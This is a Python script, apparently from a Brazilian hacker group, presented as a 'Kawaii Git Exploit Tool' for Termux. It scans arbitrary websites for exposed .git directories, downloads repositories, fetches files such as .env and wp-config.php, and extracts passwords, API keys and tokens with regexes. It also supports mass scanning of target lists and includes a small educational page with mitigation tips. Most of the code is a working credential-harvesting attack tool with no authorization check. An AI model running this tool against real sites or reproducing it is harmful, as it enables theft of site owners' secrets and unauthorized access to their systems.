import os
import sys
import random
import requests
import threading
import time
import re
import subprocess
from datetime import datetime

# Configurações de cores para o terminal
class Colors:
    PINK = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Carinhas fofas para mensagens
KAWAII_FACES = [
    "(◕‿◕✿)", "(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧", "✧･ﾟ: *✧･ﾟ:*", "(◠‿◠)", "(ᗒᗨᗕ)", 
    "(★ω★)", "(ﾉ´ヮ`)ﾉ*: ･ﾟ", "(ノ°ο°)ノ", "(◕‿◕)♡", "ヽ(>∀<☆)ノ",
    "(づ｡◕‿‿◕｡)づ", "♡(˃͈ દ ˂͈ ༶ )", "(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧", "(◍•ᴗ•◍)❤", 
    "♪(๑ᴖ◡ᴖ๑)♪", "(っ◔◡◔)っ ♥", "(´･ᴗ･ ` )", "(●´□`)♡", "(´｡• ᵕ •｡`) ♡"
]

def get_kawaii_face():
    return random.choice(KAWAII_FACES)

def print_banner():
    banner = f"""
{Colors.PINK}╔══════════════════════════════════════════════════════════════╗
{Colors.PINK}║{Colors.BOLD}      ♡ Kawaii Git Exploit Tool para Termux ♡       {Colors.PINK}║
{Colors.PINK}║                                                        ║
{Colors.PINK}║    {Colors.CYAN}(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Explorador de Git exposto ✧･ﾟ: *✧･ﾟ   {Colors.PINK}║
{Colors.PINK}║                                                        ║
{Colors.PINK}║    {Colors.YELLOW}Feito com ❤️ pela Rede Valkiria - Anti CP & Fraudes    {Colors.PINK}║
{Colors.PINK}╚══════════════════════════════════════════════════════════════╝
{Colors.END}"""
    print(banner)

def print_menu():
    menu = f"""
{Colors.PINK}╔═══════════════════════════ MENU ═══════════════════════════╗
{Colors.PINK}║ {Colors.CYAN}1. Verificar Git exposto                        {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}2. Explorar arquivos do Git                     {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}3. Baixar repositório Git                       {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}4. Buscar credenciais em arquivos               {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}5. Varredura em massa de sites                  {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}6. Criar site educativo sobre a vulnerabilidade {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.CYAN}7. Iniciar servidor local do site               {get_kawaii_face()} {Colors.PINK}║
{Colors.PINK}║ {Colors.RED}0. Sair                                         (╥﹏╥) {Colors.PINK}║
{Colors.PINK}╚══════════════════════════════════════════════════════════════╝
{Colors.END}"""
    print(menu)

def create_site():
    site_dir = "site.git"
    if not os.path.exists(site_dir):
        os.makedirs(site_dir)
    
    # Criar arquivo index.html
    html_content = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Git Exposed - Rede Valkiria</title>
    <style>
        body {{
            font-family: 'Arial', sans-serif;
            background-color: #ffe6f2;
            color: #8b0000;
            margin: 0;
            padding: 0;
            background-image: url('https://i.pinimg.com/originals/49/61/1f/49611f1c5a3e0a8e963f8a3b8e9f1416.gif');
            background-size: cover;
            background-attachment: fixed;
        }}
        
        .container {{
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(255, 230, 242, 0.9);
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(255, 105, 180, 0.5);
            margin-top: 30px;
            margin-bottom: 30px;
        }}
        
        header {{
            text-align: center;
            padding: 20px 0;
            border-bottom: 2px dashed #ff69b4;
            margin-bottom: 30px;
        }}
        
        h1 {{
            color: #ff1493;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(255, 182, 193, 0.8);
        }}
        
        h2 {{
            color: #ff69b4;
            border-bottom: 1px dotted #ff69b4;
            padding-bottom: 5px;
        }}
        
        .kawaii {{
            font-size: 1.5em;
            margin: 10px 0;
        }}
        
        .anime-girl {{
            float: right;
            width: 200px;
            margin-left: 20px;
            animation: bounce 2s infinite;
        }}
        
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-20px); }}
        }}
        
        .dancing {{
            display: inline-block;
            animation: dance 1s infinite alternate;
        }}
        
        @keyframes dance {{
            0% {{ transform: rotate(-5deg); }}
            100% {{ transform: rotate(5deg); }}
        }}
        
        .warning {{
            background-color: #fff0f5;
            border-left: 5px solid #ff69b4;
            padding: 10px;
            margin: 10px 0;
        }}
        
        footer {{
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 2px dashed #ff69b4;
            font-size: 0.9em;
        }}
        
        .btn {{
            background-color: #ff69b4;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 10px 0;
            transition: all 0.3s;
        }}
        
        .btn:hover {{
            background-color: #ff1493;
            transform: scale(1.05);
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Git Exposed Vulnerability <span class="dancing">(◕‿◕✿)</span></h1>
            <p class="kawaii">✧･ﾟ: *✧･ﾟ:* Entenda a vulnerabilidade *:･ﾟ✧*:･ﾟ✧</p>
        </header>
        
        <section>
            <img src="https://i.pinimg.com/originals/0f/2a/c5/0f2ac5e94e1a9a0d5e7c2f4e4b8a8d2a.gif" alt="Anime Girl" class="anime-girl">
            
            <h2>O que é a vulnerabilidade Git exposto?</h2>
            <p>Um repositório Git exposto ocorre quando o diretório <code>.git</code> de um site fica acessível publicamente na internet. Isso permite que qualquer pessoa baixe todo o código-fonte do projeto, incluindo possíveis credenciais e informações sensíveis.</p>
            
            <div class="warning">
                <h3>✧･ﾟ: * Atenção! *:･ﾟ✧</h3>
                <p>Esta ferramenta foi desenvolvida apenas para fins educacionais e de teste de segurança. Nunca use essas informações para atividades ilegais!</p>
            </div>
            
            <h2>O que o Kawaii Git Exploit Tool faz?</h2>
            <ul>
                <li>♡ Verifica se um site tem o diretório .git exposto</li>
                <li>♡ Explora arquivos sensíveis como config, .env, etc.</li>
                <li>♡ Busca credenciais em arquivos do Git</li>
                <li>♡ Permite baixar o repositório Git inteiro</li>
                <li>♡ Faz varredura em massa de vários sites</li>
            </ul>
            
            <h2>O que o script NÃO faz?</h2>
            <ul>
                <li>✘ Não realiza ataques DDoS ou brute force</li>
                <li>✘ Não explora vulnerabilidades além do Git exposto</li>
                <li>✘ Não modifica ou deleta arquivos no servidor</li>
                <li>✘ Não realiza atividades ilegais</li>
            </ul>
            
            <h2>Como se proteger?</h2>
            <p>Para proteger seu site:</p>
            <ol>
                <li>Nunca deixe o diretório .git acessível publicamente</li>
                <li>Use arquivos .htaccess para bloquear acesso</li>
                <li>Remova credenciais do código antes de fazer commit</li>
                <li>Use variáveis de ambiente para informações sensíveis</li>
            </ol>
            
            <a href="https://github.com/" class="btn" target="_blank">Saiba mais sobre segurança Git</a>
        </section>
        
        <footer>
            <p>Desenvolvido com ❤️ pela <strong>Rede Valkiria</strong> - Grupo hacker anti CP e fraudes</p>
            <p>✧･ﾟ: *✧･ﾟ:* Nosso objetivo é um internet mais segura *:･ﾟ✧*:･ﾟ✧</p>
            <p class="kawaii">(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Obrigado por usar nossa ferramenta! ✧･ﾟ: *✧･ﾟ:*</p>
        </footer>
    </div>
    
    <script>
        // Animação adicional
        document.querySelectorAll('h2').forEach(h2 => {{
            h2.innerHTML = h2.innerHTML + ' <span class="dancing">✿</span>';
        }});
        
        // Efeito de neve kawaii
        function createSnow() {{
            const snow = document.createElement('div');
            snow.innerHTML = '❀';
            snow.style.position = 'fixed';
            snow.style.color = '#ff69b4';
            snow.style.fontSize = Math.random() * 20 + 10 + 'px';
            snow.style.top = '-20px';
            snow.style.left = Math.random() * window.innerWidth + 'px';
            snow.style.opacity = Math.random();
            snow.style.animation = 'fall ' + (Math.random() * 5 + 3) + 's linear infinite';
            document.body.appendChild(snow);
            
            setTimeout(() => {{
                snow.remove();
            }}, 5000);
        }}
        
        // Adiciona estilo para a animação de queda
        const style = document.createElement('style');
        style.innerHTML = `
            @keyframes fall {{
                to {{
                    transform: translateY(100vh);
                }}
            }}
        `;
        document.head.appendChild(style);
        
        // Cria flocos de neve periodicamente
        setInterval(createSnow, 300);
    </script>
</body>
</html>
"""
    
    with open(os.path.join(site_dir, "index.html"), "w", encoding="utf-8") as f:
        f.write(html_content)
    
    # Criar arquivo CSS adicional (opcional)
    css_content = """
/* Estilos adicionais podem ser colocados aqui */
.heart {
    color: #ff69b4;
    animation: heartbeat 1.5s infinite;
}

@keyframes heartbeat {
    0% { transform: scale(1); }
    25% { transform: scale(1.1); }
    50% { transform: scale(1); }
    75% { transform: scale(1.1); }
    100% { transform: scale(1); }
}
"""
    with open(os.path.join(site_dir, "styles.css"), "w", encoding="utf-8") as f:
        f.write(css_content)
    
    print(f"\n{Colors.GREEN}✧･ﾟ: *✧･ﾟ:* Site educativo criado na pasta 'site.git' *:･ﾟ✧*:･ﾟ✧{Colors.END}")
    print(f"{Colors.CYAN}Você pode visualizá-lo com a opção 7 do menu {get_kawaii_face()}{Colors.END}")

def start_local_server():
    site_dir = "site.git"
    if not os.path.exists(site_dir):
        print(f"\n{Colors.RED}(╥﹏╥) A pasta 'site.git' não existe. Crie o site primeiro com a opção 6.{Colors.END}")
        return
    
    print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Iniciando servidor local *:･ﾟ✧*:･ﾟ✧{Colors.END}")
    print(f"{Colors.CYAN}Abra seu navegador em: {Colors.BOLD}http://localhost:8080{Colors.END}")
    print(f"{Colors.YELLOW}Pressione Ctrl+C para parar o servidor{Colors.END}")
    
    try:
        os.chdir(site_dir)
        subprocess.run(["python", "-m", "http.server", "8080"])
    except KeyboardInterrupt:
        print(f"\n{Colors.PINK}Servidor parado {get_kawaii_face()}{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}Erro ao iniciar servidor: {str(e)}{Colors.END}")
    finally:
        os.chdir("..")

def check_git_exposed(url):
    print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Verificando {url} *:･ﾟ✧*:･ﾟ✧{Colors.END}")
    
    if not url.endswith('/.git/'):
        url = url.rstrip('/') + '/.git/'
    
    files_to_check = [
        'HEAD', 'objects/info/packs', 'description',
        'config', 'COMMIT_EDITMSG', 'index',
        'info/refs', 'logs/HEAD', 'refs/heads/master'
    ]
    
    found_files = []
    
    for filename in files_to_check:
        target_url = url + filename
        print(f"{Colors.CYAN}Verificando: {target_url}{Colors.END}", end='\r')
        
        try:
            response = requests.get(target_url, timeout=10)
            if response.status_code == 200:
                print(f"{Colors.GREEN}★ Arquivo encontrado: {filename.ljust(50)}{Colors.END}")
                found_files.append(filename)
            else:
                print(f"{Colors.YELLOW}Arquivo não encontrado: {filename.ljust(50)}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}Erro ao verificar {filename}: {str(e).ljust(50)}{Colors.END}")
    
    # Verificar diretório de objetos
    objects_url = url + 'objects/'
    print(f"{Colors.CYAN}Verificando diretório de objetos...{Colors.END}", end='\r')
    try:
        response = requests.get(objects_url, timeout=10)
        if response.status_code == 200:
            print(f"{Colors.GREEN}★ Diretório de objetos encontrado!{Colors.END}")
            found_files.append('objects/')
        else:
            print(f"{Colors.YELLOW}Diretório de objetos não encontrado.{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Erro ao verificar objetos: {str(e)}{Colors.END}")
    
    if len(found_files) >= 3:
        print(f"\n{Colors.GREEN}{get_kawaii_face()} Git exposto encontrado! Arquivos descobertos: {len(found_files)}{Colors.END}")
        return True, found_files
    else:
        print(f"\n{Colors.RED}(´• ω •`) Git não exposto ou inacessível{Colors.END}")
        return False, []

def explore_git(url, found_files):
    print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Explorando arquivos em {url} *:･ﾟ✧*:･ﾟ✧{Colors.END}")
    
    interesting_files = [
        'config', 'HEAD', 'logs/HEAD', 'index',
        'COMMIT_EDITMSG', 'info/exclude', 'description',
        '.env', 'wp-config.php', 'config.php',
        'database.yml', 'settings.py', 'credentials.json',
        'secrets.ini'
    ]
    
    sensitive_files = []
    
    for filename in interesting_files:
        target_url = url + filename
        print(f"{Colors.CYAN}Verificando: {filename}{Colors.END}", end='\r')
        
        try:
            response = requests.get(target_url, timeout=10)
            if response.status_code == 200:
                print(f"{Colors.GREEN}★ Arquivo encontrado: {filename.ljust(50)}{Colors.END}")
                sensitive_files.append(filename)
                
                # Verificar automaticamente por credenciais em arquivos sensíveis
                if any(x in filename.lower() for x in ['config', '.env', 'wp-config']):
                    search_credentials_in_file(target_url, response.text)
            else:
                print(f"{Colors.YELLOW}Arquivo não encontrado: {filename.ljust(50)}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}Erro ao verificar {filename}: {str(e).ljust(50)}{Colors.END}")
    
    if sensitive_files:
        print(f"\n{Colors.GREEN}{get_kawaii_face()} Arquivos sensíveis encontrados: {len(sensitive_files)}{Colors.END}")
    else:
        print(f"\n{Colors.YELLOW}(´• ω •`) Nenhum arquivo sensível encontrado{Colors.END}")
    
    return sensitive_files

def download_git_repo(url):
    print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Baixando repositório de {url} *:･ﾟ✧*:･ﾟ✧{Colors.END}")
    
    # Verificar se o git-dumper está instalado
    try:
        subprocess.run(["git-dumper", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        git_dumper_installed = True
    except:
        git_dumper_installed = False
    
    if git_dumper_installed:
        # Usar git-dumper se estiver instalado
        output_dir = url.split('//')[-1].replace('/', '_') + "_git"
        print(f"{Colors.CYAN}Usando git-dumper para baixar o repositório...{Colors.END}")
        
        try:
            subprocess.run(["git-dumper", url, output_dir], check=True)
            print(f"\n{Colors.GREEN}{get_kawaii_face()} Repositório baixado com sucesso em: {output_dir}{Colors.END}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"\n{Colors.RED}(╥﹏╥) Erro ao baixar repositório: {str(e)}{Colors.END}")
            return False
    else:
        # Método manual se git-dumper não estiver instalado
        print(f"{Colors.YELLOW}git-dumper não encontrado. Tentando método manual...{Colors.END}")
        
        if not url.endswith('/.git/'):
            url = url.rstrip('/') + '/.git/'
        
        output_dir = url.split('//')[-1].replace('/', '_') + "_manual"
        os.makedirs(output_dir, exist_ok=True)
        
        files_to_download = [
            'HEAD', 'objects/info/packs', 'description',
            'config', 'COMMIT_EDITMSG', 'index',
            'info/refs', 'logs/HEAD', 'refs/heads/master'
        ]
        
        success = True
        
        for filename in files_to_download:
            target_url = url + filename
            output_path = os.path.join(output_dir, filename)
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            
            print(f"{Colors.CYAN}Baixando: {filename}{Colors.END}", end='\r')
            
            try:
                response = requests.get(target_url, timeout=10)
                if response.status_code == 200:
                    with open(output_path, 'wb') as f:
                        f.write(response.content)
                    print(f"{Colors.GREEN}✓ Arquivo baixado: {filename.ljust(50)}{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}Arquivo não encontrado: {filename.ljust(50)}{Colors.END}")
                    success = False
            except Exception as e:
                print(f"{Colors.RED}Erro ao baixar {filename}: {str(e).ljust(50)}{Colors.END}")
                success = False
        
        if success:
            print(f"\n{Colors.GREEN}{get_kawaii_face()} Download manual concluído em: {output_dir}{Colors.END}")
            print(f"{Colors.YELLOW}Nota: O download manual pode não incluir todos os arquivos.{Colors.END}")
            return True
        else:
            print(f"\n{Colors.RED}(╥﹏╥) Download manual incompleto. Alguns arquivos falharam.{Colors.END}")
            return False

def search_credentials_in_file(url, content=None):
    if content is None:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                content = response.text
            else:
                print(f"{Colors.RED}(╥﹏╥) Erro ao acessar arquivo: {response.status_code}{Colors.END}")
                return
        except Exception as e:
            print(f"{Colors.RED}(ﾉﾟ0ﾟ)ﾉ~ Erro: {str(e)}{Colors.END}")
            return
    
    patterns = [
        r'(?i)user(name)?\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
        r'(?i)pass(word)?\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
        r'(?i)host\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
        r'(?i)db(name)?\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
        r'(?i)api_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
        r'(?i)secret\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
        r'(?i)token\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
        r'(?i)password\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]'
    ]
    
    found_creds = []
    
    for pattern in patterns:
        matches = re.findall(pattern, content)
        for match in matches:
            if isinstance(match, tuple):
                # Pegar o último elemento não vazio do grupo de captura
                value = next((x for x in match[::-1] if x), None)
                if value and value not in found_creds:
                    found_creds.append(value)
            elif match and match not in found_creds:
                found_creds.append(match)
    
    if found_creds:
        print(f"\n{Colors.GREEN}(★ω★) Credenciais encontradas no arquivo!{Colors.END}")
        for cred in found_creds:
            print(f"{Colors.RED}• {cred}{Colors.END}")
    else:
        print(f"\n{Colors.YELLOW}(´･_･`) Nenhuma credencial encontrada no arquivo{Colors.END}")

def mass_scan(targets):
    print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Iniciando varredura em massa *:･ﾟ✧*:･ﾟ✧{Colors.END}")
    print(f"{Colors.CYAN}Alvos a verificar: {len(targets)}{Colors.END}")
    
    vulnerable_sites = []
    
    for i, target in enumerate(targets, 1):
        target = target.strip()
        if not target:
            continue
        
        print(f"\n{Colors.PINK}[{i}/{len(targets)}] Verificando: {target}{Colors.END}")
        
        # Verificar caminhos .git padrão e alternativos
        paths_to_check = ['/.git/', '/.git/HEAD', '/git/HEAD', '/.git/config']
        
        found = False
        found_files = []
        
        for path in paths_to_check:
            url = target.rstrip('/') + path
            print(f"{Colors.CYAN}Testando: {path}{Colors.END}", end='\r')
            
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    found = True
                    found_files.append(path.split('/')[-1] or path.split('/')[-2])
                    print(f"{Colors.GREEN}★ Vulnerabilidade encontrada em {target}{Colors.END}")
                    break
            except:
                continue
        
        if found:
            vulnerable_sites.append((target, found_files))
    
    if vulnerable_sites:
        print(f"\n{Colors.GREEN}{get_kawaii_face()} Varredura concluída - {len(vulnerable_sites)} alvos vulneráveis encontrados!{Colors.END}")
        for site, files in vulnerable_sites:
            print(f"\n{Colors.RED}★ Alvo vulnerável: {site}{Colors.END}")
            print(f"{Colors.YELLOW}Arquivos encontrados: {', '.join(files)}{Colors.END}")
    else:
        print(f"\n{Colors.YELLOW}(´• ω •`) Varredura concluída - nenhum alvo vulnerável encontrado{Colors.END}")

def main():
    print_banner()
    
    while True:
        print_menu()
        choice = input(f"\n{Colors.PINK}♡ Escolha uma opção: {Colors.END}")
        
        if choice == "1":
            url = input(f"\n{Colors.CYAN}Digite a URL do site (ex: https://exemplo.com): {Colors.END}")
            if url:
                is_exposed, found_files = check_git_exposed(url)
                
                if is_exposed and input(f"\n{Colors.CYAN}Deseja explorar os arquivos encontrados? (s/n): {Colors.END}").lower() == 's':
                    explore_git(url.rstrip('/') + '/.git/', found_files)
        
        elif choice == "2":
            url = input(f"\n{Colors.CYAN}Digite a URL do .git (ex: https://exemplo.com/.git/): {Colors.END}")
            if url:
                explore_git(url, [])
        
        elif choice == "3":
            url = input(f"\n{Colors.CYAN}Digite a URL do .git (ex: https://exemplo.com/.git/): {Colors.END}")
            if url:
                download_git_repo(url)
        
        elif choice == "4":
            url = input(f"\n{Colors.CYAN}Digite a URL do arquivo (ex: https://exemplo.com/.git/config): {Colors.END}")
            if url:
                search_credentials_in_file(url)
        
        elif choice == "5":
            targets_input = input(f"\n{Colors.CYAN}Digite os alvos (um por linha) ou deixe em branco para carregar de arquivo: {Colors.END}")
            
            if targets_input.strip():
                targets = targets_input.split('\n')
            else:
                file_path = input(f"{Colors.CYAN}Digite o caminho do arquivo com os alvos: {Colors.END}")
                try:
                    with open(file_path, 'r') as f:
                        targets = f.read().splitlines()
                    print(f"{Colors.GREEN}Alvos carregados: {len(targets)}{Colors.END}")
                except Exception as e:
                    print(f"{Colors.RED}(╥﹏╥) Erro ao carregar arquivo: {str(e)}{Colors.END}")
                    continue
            
            if targets:
                mass_scan(targets)
        
        elif choice == "6":
            create_site()
        
        elif choice == "7":
            start_local_server()
        
        elif choice == "0":
            print(f"\n{Colors.PINK}✧･ﾟ: *✧･ﾟ:* Obrigado por usar o Kawaii Git Exploit Tool! *:･ﾟ✧*:･ﾟ✧{Colors.END}")
            print(f"{Colors.CYAN}Desenvolvido com ❤️ pela Rede Valkiria - Anti CP & Fraudes{Colors.END}")
            break
        
        else:
            print(f"\n{Colors.RED}(╥﹏╥) Opção inválida! Por favor, escolha uma opção válida.{Colors.END}")
        
        input(f"\n{Colors.PINK}Pressione Enter para continuar...{Colors.END}")
        print("\n" * 2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.PINK}\n(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Programa encerrado pelo usuário ✧･ﾟ: *✧･ﾟ:*{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}(╥﹏╥) Ocorreu um erro inesperado: {str(e)}{Colors.END}")
        sys.exit(1)
